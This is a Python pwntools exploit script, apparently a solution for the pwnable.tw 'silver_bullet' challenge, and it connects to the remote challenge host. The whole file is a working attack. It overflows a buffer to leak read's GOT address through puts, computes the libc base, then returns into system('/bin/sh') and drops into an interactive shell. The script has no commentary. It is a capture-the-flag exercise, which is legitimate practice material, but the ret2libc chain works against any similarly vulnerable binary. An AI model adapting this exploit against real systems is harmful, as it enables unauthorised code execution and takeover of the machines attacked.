from pwn import *

e = ELF("./silver_bullet")
libc = ELF("./libc_32.so.6")

if "--remote" in sys.argv:
  p = remote("chall.pwnable.tw", 10103)
else:
  p = process(["./ld-linux-32.so", e.path], env={"LD_PRELOAD": libc.path})

def setup():
  p.sendlineafter(":", "1")
  p.sendlineafter(":", "A" * (0x30 - 1))

  p.sendlineafter(":", "2")
  p.sendafter(":", "B")

setup()
p.sendlineafter(":", "2")
p.sendlineafter(":", "C" * (0x4 + 4 - 1) + p32(e.symbols["puts"]) + p32(e.symbols["main"]) + p32(e.got["read"]))

p.sendlineafter(":", "3")
p.sendlineafter(":", "3")

p.recvuntil("win !!")
p.recvline()
libc_base = u32(p.recvline()[:4]) - libc.symbols["read"]

print("Libc Base: {:#x}".format(libc_base))

setup()
p.sendlineafter(":", "2")
p.sendlineafter(":", "C" * (0x4 + 4 - 1) + p32(libc_base + libc.symbols["system"]) + "C" * 4 + p32(libc_base + next(libc.search("/bin/sh"))))

p.sendlineafter(":", "3")
p.sendlineafter(":", "3")

p.recvuntil("win !!")

p.interactive()
